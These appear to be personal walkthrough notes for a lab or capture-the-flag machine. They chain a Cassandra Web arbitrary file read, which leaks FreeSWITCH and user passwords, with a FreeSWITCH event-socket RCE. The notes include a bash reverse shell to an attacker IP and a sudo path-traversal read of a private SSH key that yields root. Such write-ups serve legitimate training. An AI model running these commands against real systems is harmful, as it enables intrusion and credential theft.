## Takeaway
## Metadata

- Port `8021` is running `FreeSWITCH mod_event_socket`.
	- According to `searchsploit`, `FreeSWITCH 1.10.1` is affected by `RCE`. ![[Pasted image 20240329143322.png]]
	- Looking at the exploit code, it is indeed related to `Event Socket` at port 8021. Moreover, it seems that the indication of the vulnerability is, after connection, authentication is prompted. ![[Pasted image 20240329143700.png]]
	- Running `nc 192.168.222.240 8021` indeed prompted for authentication. However, the default password provided within the exploit `ClueCon` is incorrect.![[Pasted image 20240329143952.png]]
- Port `3000` is running `Cassandra Web`. ![[Pasted image 20240329143813.png]]
	- According to `searchsploit`, `Cassandra Web 0.5.0` is affected by `Arbitrary File Read` but one can not locate the exact version number.  ![[Pasted image 20240329144139.png]]
	- After trying out the exploit, it looks like it is indeed vulnerable to `Arbitrary File Read`.![[Pasted image 20240329144321.png]]
	- A little research (https://developer.signalwire.com/freeswitch/FreeSWITCH-Explained/Modules/mod_event_socket_1048924/) seems to indicate that the configuration for `Event Socket` is at `<conf_dir>/autoload_configs/[event_socket.conf.xml]` which in out case `/etc/freeswitch/autoload_configs/event_socket.conf.xml`.
	- Run `python3 49362.py -p 3000 192.168.222.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml` will reveal the actual password as `StrongClueConEight021`.![[Pasted image 20240329150053.png]]
	- Run `python3 49362.py -p 3000 192.168.222.240 /proc/self/cmdline` as the comments suggests will reveal user `cassie`'s credential as `SecondBiteTheApple330`.                                                       ![[Pasted image 20240329151046.png]]![[Pasted image 20240329151155.png]]
- Enumerate as `cassie` will identify that the user can run `cassandra-web` as `root` without password.![[Pasted image 20240329153234.png]]
# Exploitation 
## Shell as freeswitch
- Change password within exploit to `StrongClueConEight021` and run `python3 freeSWITCH_RCE.py 192.168.222.240 '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.189/80 0>&1"'` to obtain a reverse shell as the user `freeswitch`.
## Shell as cassie
- Within the shell of `freeswitch`, run `su cassie` and enter password `SecondBiteTheApple330` to get a session as the user `cassie`.
# PrivEsc
- Spin up `Cassandra Web` as `root`  at port `4444` with command `sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 0.0.0.0:4444&`, which give us `Privileged Read` as `root` upon exploitation.
- Within the same shell, Run `curl http://localhost:4444/../../../../../../../../../../home/anthony/.bash_history --path-as-is` to identify that `anthony` and `root` shares the same public key.![[Pasted image 20240329154112.png]]
	- Run `curl http://localhost:4444/../../../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is` to retrieve private key and run `ssh root@192.168.222.240 -i id_ras_root` at attacker machine to obtain an SSH session as `root`. 